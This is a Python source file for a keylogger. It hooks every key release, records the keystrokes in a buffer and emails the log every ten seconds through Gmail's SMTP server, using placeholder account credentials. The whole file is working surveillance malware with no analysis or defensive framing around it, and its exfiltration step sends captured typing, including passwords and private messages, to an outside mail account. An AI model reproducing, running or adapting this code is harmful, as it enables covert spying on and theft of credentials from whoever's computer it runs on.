import keyboard
import smtplib
from threading import Semaphore, Timer

send_report_every=10 #seconds
email_addr="YOUR MAIL ID HERE"
email_password="YOUR PASSWORD HERE"

class keylogger():
     def __init__(self,interval):
          #pass send_report_every to interval
          self.interval=interval
          #string to log the key press
          self.log=""
          #for blocking after setting on_release listener
          self.semaphore=Semaphore(0)

     def callback(self,event):
          #when a key is released
          name=event.name
          if len(name)>1:
               #not  a chaaar special key(ctrl,space, alt etc)
               if name == "space":
                   #print space instead of the word "space"
                   name=" "
               elif name =="enter":
                    #add a new line
                    name="[Enter]\n"
               elif name=="decimal":
                    name="."
               else:
                    #replace space with these characters
                    name=name.replace(" ","_")
                    name=f"[{name.upper()}]"
          self.log+=name
     def sendmail(self,email,password,message):
          #manage connection to the smtp server
          server=smtplib.SMTP(host="smtp.gmail.com",port=587)
          #connect to server in TLS mode(for security)
          server.starttls()
          #login to email
          server.login(email,password)
          #send the message
          server.sendmail(email,email,message)
          #terminte the session
          server.quit()
#This  method send mail after a pariod of time
     def report(self):
          if self.log:
               #if something in log report it
               self.sendmail(email_addr,email_password,self.log)

          self.log=""
          Timer(interval=self.interval,function=self.report).start()

     def start(self):
          #start the keylogger
          keyboard.on_release(callback=self.callback)
          #start reporting the keylogs
          self.report()
          #block the thread
          self.semaphore.acquire()

if __name__=="__main__":
      keylogger=keylogger(interval=send_report_every)
      keylogger.start()




               
          
